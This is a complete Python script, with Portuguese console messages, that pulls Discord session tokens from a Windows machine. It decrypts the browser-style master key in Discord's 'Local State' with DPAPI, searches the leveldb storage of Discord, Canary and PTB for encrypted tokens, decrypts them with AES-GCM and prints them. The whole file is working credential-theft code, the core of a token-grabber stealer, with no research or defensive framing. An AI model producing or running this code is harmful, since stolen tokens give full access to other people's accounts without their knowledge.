import os
import re
import json
import base64

# pip install pywin32 pycryptodome
import win32crypt
from Crypto.Cipher import AES

def get_encryption_key(roaming_path: str) -> bytes:
    local_state_path = os.path.join(roaming_path, 'Local State')
    with open(local_state_path, 'r', encoding='utf-8') as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_token(encrypted: bytes, key: bytes) -> str:
    try:
        
        iv   = encrypted[3:15]
        data = encrypted[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode('utf-8')
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1].decode('utf-8')
        except Exception:
            return ''

def extract_tokens() -> dict:
    appdata = os.getenv('APPDATA', '')
    clients = {
        'Discord':        os.path.join(appdata, 'discord'),
        'Discord Canary': os.path.join(appdata, 'discordcanary'),
        'Discord PTB':    os.path.join(appdata, 'discordptb'),
    }

    token_regex = re.compile(r'dQw4w9WgXcQ:[^"]+')
    found = {}

    for name, path in clients.items():
        if not os.path.exists(path):
            continue
        try:
            key = get_encryption_key(path)
        except Exception:
            continue

        db_path = os.path.join(path, 'Local Storage', 'leveldb')
        if not os.path.exists(db_path):
            continue

        for filename in os.listdir(db_path):
            if not filename.endswith(('.log', '.ldb')):
                continue
            filepath = os.path.join(db_path, filename)
            try:
                with open(filepath, 'rb') as f:
                    content = f.read().decode('utf-8', errors='ignore')
                for match in token_regex.findall(content):
                    enc_b64 = match.split('dQw4w9WgXcQ:')[1]
                    encrypted_bytes = base64.b64decode(enc_b64)
                    token = decrypt_token(encrypted_bytes, key)
                    if token:
                        found[name] = token
            except Exception:
                continue

    return found

if __name__ == '__main__':
    print("Extraindo tokens...\n")
    tokens = extract_tokens()

    if not tokens:
        print("Nenhum token encontrado.")
        print("Dica: certifique que o Discord está instalado e você já logou.")
    else:
        for client, token in tokens.items():
            print(f"[{client}]\n{token}\n")